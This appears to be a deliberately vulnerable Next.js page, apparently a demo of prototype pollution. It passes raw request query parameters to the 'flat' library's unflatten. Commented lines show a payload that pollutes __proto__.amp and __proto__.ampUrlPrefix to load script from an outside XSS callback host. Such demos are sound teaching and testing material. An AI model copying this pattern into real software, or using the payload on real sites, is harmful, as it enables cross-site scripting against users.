import Head from "next/head";

var unflatten = require("flat").unflatten;

export default function Home({ msg }) {
  return (
    <div>
      <Head>
        <title>Vulnerable</title>
      </Head>

      <p>{msg} page!</p>
    </div>
  );
}

// Object.prototype.notFound = true;

export async function getServerSideProps(context) {
  // unflatten({
  //   "__proto__.amp": "hybrid",
  //   "__proto__.ampUrlPrefix": "https://xss-callback.pwnfunction.repl.co/",
  // });

  const out = unflatten({ ...context.query });

  return {
    props: { msg: "Vulnerable" },
  };
}
